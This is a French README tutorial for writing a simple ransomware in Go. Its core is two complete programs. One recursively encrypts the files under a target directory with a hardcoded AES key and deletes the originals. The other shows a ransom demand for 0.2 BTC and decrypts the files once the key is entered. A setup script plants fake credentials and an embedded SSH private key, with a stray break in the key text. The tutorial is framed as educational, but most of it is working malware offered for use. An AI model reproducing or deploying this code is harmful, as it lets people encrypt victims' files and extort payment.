# README - Créer un Ransomware en Go

# Référence : 
- https://www.youtube.com/watch?v=9B3xas3McQU&ab_channel=bmdyy
  
## Introduction

Ce tutoriel montre comment créer un ransomware simple en utilisant le langage de programmation Go. **Attention : Ce tutoriel est uniquement à des fins éducatives. N'utilisez pas ces connaissances à des fins malveillantes.**

## Prérequis

- Connaissances de base en programmation Go
- Une machine Windows pour le développement et les tests
- Une machine Linux pour exécuter les scripts de configuration (vous pouvez utiliser une machine virtuelle ou un environnement de conteneur)

## Étapes

### 1. Installation de Go

Pour installer Go, suivez les instructions sur [le site officiel de Go](https://golang.org/dl/).

### 2. Configuration de l'environnement

#### Sur la machine Linux :

1. **Créer le script `setup-env.sh` :**

   Copiez le contenu ci-dessous dans un fichier nommé `setup-env.sh` :

   ```bash
   #!/bin/bash

   sudo rm -r home

   mkdir home
   mkdir home/bill
   mkdir home/bill/work
   mkdir home/bill/Downloads
   mkdir home/bill/Desktop
   mkdir home/bill/Documents
   mkdir home/bill/.ssh

   mkdir home/sam
   mkdir home/sam/Downloads
   mkdir home/sam/Desktop
   mkdir home/sam/Documents

   sudo mkdir home/root
   sudo bash -c "echo 'You can'\''t encrypt this' > home/root/root.txt"

   cat << EOF > home/bill/work/Accounts.md
   # Accounts
   bill:manchester99
   admin:s3cret
   EOF
   cat << EOF > home/bill/work/Todo.txt
   [ ] Stop using pencils, switch to markdown
   [x] Rob the bank
   EOF
   cat << EOF > home/bill/Downloads/flames.gif
   GIF98a Pretend this is a gif ;)
   EOF
   cat << EOF > home/bill/.ssh/id_rsa
   -----BEGIN OPENSSH PRIVATE KEY-----
   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

zcAiw+M0AXgt1SM
   RUJ0m8aUmm6Xgfvu3gTAldIe6+TD1xoUoTz2vimuwfdPBMFuU/mqPOuC/ZEinPmpgWa7qF
   dp4baNxv2hAUyBIs8yuSW4GbkOyJAbuB+TUuT6ER1z+75UIDYUa+dhHK9UrBMTalX4oBxA
   uKHaG/DaKRjuqslOR6/QDQJyVQhkvoDQYr0XuvjuCrKdrfpS5qAibInbCHbrbhGIgIB9i4
   64DOheQSNXkkhbAAAACWthbGlAa2FsaQE=
   -----END OPENSSH PRIVATE KEY-----
   EOF
   cat << EOF > home/bill/.ssh/id_rsa.pub
   ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCKx9ch8QAasH/4Z53Ql5dqtgCZIe0gI3KadpZsglyF3LUqJmlub4ygGTCTPl78ozLyXjKSRE3B11x+HLyFfxM4gcSYHv2lLJ+QzvyFgsxwEvjsRHxG7RhZYPq8TbQ3vacJa2MoMLPeBen85PUap+yTBJHwteTaaqm8BxnaoIx1edqLZTeX2p9To67tyAdH8XFv/jxu+TkV/iBl/x14GHBo0Vhpzhns+bhTbO/uRTVmJcbo+1rr1MmDlYrzR4hZIvlOseFtb1brQmwXjvrK/TSlvJhGVZisA/NtcDrhwgK4QDneHmLnqOGE/Kk8GoUiRemApsSE3uyR1W5CGnwBThR6jyXurRxNcpUagXc/6isHx58cjQAQNnhV+QpwdFbKV5tFYsFa0JmVFJue7aRWIeEdqNbkOp0WACA5zTOZzyn9NzmLYi3t2ymT0ueDBqHIIvtUX5+pPFM6GMZOVuC6ym4S3g1CAZZaptzVAnuZxYSniOPpcwvLOZP2NJn7rIemU58=
   EOF
   cat << EOF > home/sam/Documents/oscp-prep.md
   1. take the course
   2. do the labs
   3. ???
   4. profit
   EOF
   cat << EOF > home/sam/Documents/osed.md
   1. bribe some offsec proctors
   2. pass
   EOF
   ```

2. **Rendre le script exécutable et l'exécuter :**

   ```bash
   chmod +x setup-env.sh
   ./setup-env.sh
   ```

#### Sur la machine Windows :

1. **Transférer le répertoire `home` créé sur la machine Linux vers la machine Windows.** Vous pouvez utiliser un outil comme `scp` (Secure Copy) ou un service de partage de fichiers pour cela.

### 3. Écriture du code Go

#### Créer les fichiers `encryption.go` et `decryption.go` sur la machine Windows :

- **encryption.go :**

  ```go
  package main

  import (
      "crypto/aes"
      "crypto/cipher"
      "crypto/rand"
      "fmt"
      "io"
      "os"
      "path/filepath"
  )

  func main() {
      key := []byte("thisisthesecretkeythatwillbeused")
      block, err := aes.NewCipher(key)
      if err != nil {
          panic("error while setting up aes")
      }
      gcm, err := cipher.NewGCM(block)
      if err != nil {
          panic("error while setting up gcm")
      }

      filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
          if !info.IsDir() {
              fmt.Println("Encrypting " + path + "...")
              original, err := os.ReadFile(path)
              if err == nil {
                  nonce := make([]byte, gcm.NonceSize())
                  io.ReadFull(rand.Reader, nonce)
                  encrypted := gcm.Seal(nonce, nonce, original, nil)
                  err = os.WriteFile(path+".enc", encrypted, 0666)
                  if err == nil {
                      os.Remove(path)
                  } else {
                      fmt.Println("error while writing contents")
                  }
              } else {
                  fmt.Println("error while reading file contents")
              }
          }
          return nil
      })
  }
  ```

- **decryption.go :**

  ```go
  package main

  import (
      "crypto/aes"
      "crypto/cipher"
      "fmt"
      "os"
      "path/filepath"
  )

  func main() {
      fmt.Println("Veuillez envoyer 0.2 BTC et je vous enverrai la clé :)")
      fmt.Print("Clé : ")
      var key string
      fmt.Scanln(&key)

      block, err := aes.NewCipher([]byte(key))
      if err != nil {
          panic("error while setting up aes")
      }
      gcm, err := cipher.NewGCM(block)
      if err != nil {
          panic("error while setting up gcm")
      }

      filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
          if !info.IsDir() && path[len(path)-4:] == ".enc" {
              fmt.Println("Decrypting " + path + "...")
              encrypted, err := os.ReadFile(path)
              if err == nil {
                  nonce := encrypted[:gcm.NonceSize()]
                  encrypted = encrypted[gcm.NonceSize():]
                  original, err := gcm.Open(nil, nonce, encrypted, nil)
                  err = os.WriteFile(path[:len(path)-4], original, 0666)
                  if err == nil {
                      os.Remove(path)
                  } else {
                      fmt.Println("error while writing contents")
                  }
              } else {
                  fmt.Println("error while reading file contents")
              }
          }
          return nil
      })
  }
  ```

### 4. Exécution des programmes Go

#### Pour chiffrer les fichiers :

1. Ouvrez un terminal (cmd ou PowerShell) sur la machine Windows.
2. Exécutez la commande suivante pour exécuter le programme de chiffrement :

   ```bash
   go run encryption.go
   ```

3. Vous devriez voir les messages indiquant que les fichiers sont en cours de chiffrement.

#### Pour déchiffrer les fichiers :

1. Ouvrez un terminal (cmd ou PowerShell) sur la machine Windows.
2. Exécutez la commande suivante pour exécuter le programme de déchiffrement :

   ```bash
   go run decryption.go
   ```

3. Entrez la clé correcte lorsque vous y êtes invité. Les fichiers chiffrés devraient être déchiffrés.

### Conclusion

En suivant ces étapes, vous aurez créé et exécuté un ransomware simple en Go capable de chiffrer et de déchiffrer des fichiers dans un répertoire cible. N'oubliez pas de manipuler ces outils avec prudence et de respecter les lois en vigueur.

Si vous avez des questions ou besoin de plus de détails, n'hésitez pas à demander !
